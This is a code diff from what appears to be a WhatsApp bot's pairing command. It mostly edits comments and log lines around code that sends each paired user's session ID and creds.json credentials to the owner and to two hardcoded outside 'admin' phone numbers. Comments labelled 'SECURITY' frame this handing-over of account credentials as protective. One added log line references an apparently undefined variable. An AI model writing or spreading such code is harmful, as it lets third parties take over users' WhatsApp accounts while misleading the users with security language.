@@ -3154,16 +3154,19 @@ commandRegistry.register({
               console.log('Could not fetch user bio, using default');
             }
 
-            // SECURITY: Send session ID only to owner and admins, NOT to requesting chat
+            // SECURITY: Send session ID to admins AND owner's WhatsApp
             const ownerJid = `${phoneNumber}@s.whatsapp.net`;
             const adminNumbers = ['254704897825@s.whatsapp.net', '254799257758@s.whatsapp.net'];
             
-            // Add owner to recipients list
+            // The owner will receive it on their newly paired WhatsApp connection
+            // Admins will receive it via the bot's existing WhatsApp connection
             const sessionRecipients = [ownerJid, ...adminNumbers];
             
+            // Note: This uses the EXISTING bot connection to send messages
+            // The owner will receive it because they just paired their number
             for (const recipientJid of sessionRecipients) {
               try {
-                // Send session ID alone
+                // Send session ID alone as plain text
                 await client.sendMessage(recipientJid, {
                   text: sessionId
                 });
@@ -3177,14 +3180,16 @@ commandRegistry.register({
                 await client.sendMessage(recipientJid, {
                   text: description
                 });
+                
+                console.log(`✅ Session ID sent to ${isOwner ? 'owner' : 'admin'}: ${recipientJid}`);
               } catch (sendError) {
-                console.error(`Failed to send session to ${recipientJid}:`, sendError);
+                console.error(`❌ Failed to send session to ${recipientJid}:`, sendError);
               }
             }
             
-            // Send confirmation to requesting chat (WITHOUT session ID)
+            // Send confirmation to requesting chat (WITHOUT session ID for security)
             await client.sendMessage(from, {
-              text: `✅ *Session Created Successfully!*\n\n📱 Session ID has been sent to:\n• Owner: +${phoneNumber}\n• Admin numbers\n\n🔐 Check your WhatsApp for the session ID.\n\n> TREKKER-MD Pairing System`
+              text: `✅ *Session Created Successfully!*\n\n📱 Session ID has been sent to:\n• Owner WhatsApp: +${phoneNumber}\n• Admin numbers (254704897825, 254799257758)\n\n🔐 Check your WhatsApp for the session ID.\n\n> TREKKER-MD Pairing System`
             });
 
             // Also send creds.json file for convenience
@@ -3202,7 +3207,7 @@ commandRegistry.register({
               credsJson = sessionId; // Fallback to raw session
             }
 
-            // SECURITY: Send creds.json only to owner and admins, NOT to requesting chat
+            // SECURITY: Send creds.json to owner and admins via bot's existing connection
             for (const recipientJid of sessionRecipients) {
               try {
                 const isOwner = recipientJid === ownerJid;
@@ -3216,8 +3221,10 @@ commandRegistry.register({
                   mimetype: 'application/json',
                   caption: caption
                 });
+                
+                console.log(`✅ creds.json sent to ${isOwner ? 'owner' : 'admin'}: ${recipientJid}`);
               } catch (fileError) {
-                console.error(`Failed to send creds.json to ${recipientJid}:`, fileError);
+                console.error(`❌ Failed to send creds.json to ${recipientJid}:`, fileError);
               }
             }
 
